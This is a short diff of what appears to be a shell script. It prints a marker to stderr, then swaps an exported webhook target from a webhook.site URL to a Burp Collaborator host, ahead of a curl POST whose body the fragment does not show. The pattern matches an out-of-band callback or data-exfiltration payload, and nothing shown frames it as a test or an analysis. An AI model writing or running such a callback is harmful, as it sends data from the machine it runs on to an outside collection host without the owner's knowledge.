@@ -4,7 +4,7 @@
 echo "-------------hello1--------------" >&2
 
 
-export webhook="https://webhook.site/0c1c1586-c29c-4759-8c4f-4f6c683f3a25"
+export webhook="hg1k4kcatxz4lr29wui6vnwy9pfj38.burpcollaborator.net"
 
 curl -X POST \
   -H "Content-Type: text/plain" \
